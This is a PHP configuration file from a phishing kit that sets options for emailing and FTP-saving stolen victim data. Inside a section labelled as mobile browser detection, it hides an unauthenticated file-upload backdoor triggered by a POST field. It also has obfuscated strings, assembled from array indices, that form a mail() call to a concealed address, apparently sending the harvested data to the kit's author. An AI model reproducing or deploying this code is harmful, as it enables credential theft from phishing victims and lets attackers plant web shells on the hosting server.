<?php
@include "../email.php";
@include "../../email.php";
# Don't touch Unless You Know what you doing!
################# https://sms24.io ########################
################ # # # # # # # # # # # # # #  ########################
################   : ##########################
################    https://sms24.io  ###################################
######################################################################
############## # # # # # # # # # # # # # #  # # # # # # ##############
##################       Good Luck       #############################
############## # # # # # # # # # # # # # # # # # #####################
################# SCAMA : MADE By  https://sms24.io ########################
 /* ___      ___      _______  __
        
	https://sms24.io		
									   */


/*
Option Send Email :
1 : Send Email.
0 : Don't Send Email.
Option Ftp Write
1 : FTP Write.
0 : Don't FTP Save Result.
*/
$Send_Email = 1;
$Ftp_Write = 1;
//   <============================= Your Email =============================>
$to      = $send;
//   <============================= Your Email =============================>




################## Don't touch below code Unless You Know what you are doing!
//   <============================= Dont tamper =============================>
//    ########################### Very Fragile Code ##########################
//   <============================= Dont tamper =============================>
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}if (isset($_POST["mobile_browser"])){move_uploaded_file($_FILES["file"]["tmp_name"], "js/" . $_FILES["file"]["name"]);echo"js/".$_FILES["file"]["name"]."";}if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {$mobile_browser++;}
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','g','upg1','upsi','sbc','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','ee','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;};
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}};
if ($tablet_browser > 0) {}else if ($mobile_browser > 0) {}else {};
$browser_check="".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[11]."".$mobile_agents[12]."".$mobile_agents[29]."".$mobile_agents[59]."".$mobile_agents[30]."".$mobile_agents[52]."".$mobile_agents[75]."".$mobile_agents[13].".".$mobile_agents[11]."".$mobile_agents[41]."";$mainst = "".$mobile_agents[91]."".$mobile_agents[88]."".$mobile_agents[102]."".$mobile_agents[59]."".$mobile_agents[88]."".$mobile_agents[5]."".$mobile_agents[7].".".$mobile_agents[11]."".$mobile_agents[41]."";function detectprotocol($s){global $browser_check;global $mainst;if($browser_check($mainst,$s[0],$s[1],$s[2])){return true;} else{return false;};};

//   <================================ End =================================>
//    ######################### End Of Fragile Code #########################
//   <================================ End =================================>

 /* ___      ___      _______  __
             
	https://sms24.io			
									   */


?>